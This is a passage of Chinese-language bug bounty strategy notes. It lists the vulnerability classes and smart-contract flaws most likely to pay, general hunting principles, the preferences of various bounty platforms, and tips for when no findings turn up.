**2025-2026 最容易出赏金的方向**：
- 输入验证不足（Immunefi 提交最多的类型）
- 访问控制缺失（缺 onlyOwner / 缺 modifier）
- ERC-4626 Vault 通胀攻击（新兴，$11M+ 损失）
- 预言机操控（用 spot price 不用 TWAP）
- 业务逻辑错误（LLM 读代码找矛盾）
- 未初始化代理（initialize 没 disable）

**已经被修得差不多但偶尔还有（不排除）**：
- 经典重入攻击（老协议/fork 项目可能还有）
- 整数溢出（unchecked 块 / Solidity <0.8 项目）
- 闪电贷攻击（新 DEX 可能犯老错误）

### 核心原则

```
1. 所有发现都保留，验证阶段再判断价值
2. 低危发现不要丢 — 可能是高危链的起点
3. 新上线的功能/项目 > 老项目（安全成熟度低）
4. 有 PoC 的漏洞 > 理论漏洞（平台只收能证明的）
5. 组链思维：A(低危) + B(低危) = C(高危)
6. 别在一个方向卡超过 1 小时，换目标
7. 国内 SRC 规则比 H1 宽松很多（信息泄露/弱口令都收）
```

### 不同平台的偏好

| 平台 | 最爱收的 | 注意事项 |
|------|---------|---------|
| HackerOne | IDOR、认证绕过、RCE | 需要 PoC，理论不收 |
| Bugcrowd | 同 H1，审核更快 | 对新人友好 |
| Intigriti | 同 H1，竞争稍小 | 欧洲项目多 |
| Immunefi | 访问控制、预言机、Vault | 必须 PoC + 影响金额 |
| 补天 | 弱口令、未授权、信息泄露 | 低危也给钱，量大 |
| EduSRC | 几乎什么都收 | 最容易刷量的平台 |
| 漏洞盒子 | 企业 SRC，类似补天 | 中危以上有现金 |

### 挖不到时怎么办

```
1. 换目标（同一个打 1 小时没进展就换）
2. 换平台（H1 太卷就去 Intigriti / 补天）
3. 换方向（黑盒没肉就试白盒/Web3）
4. 加 Cookie（很多高危在登录态才能测到）
5. 看别人的 disclosed reports（学他们的思路）
6. 盯 scope 变化（新资产 = 第一个发现的人吃肉）
```
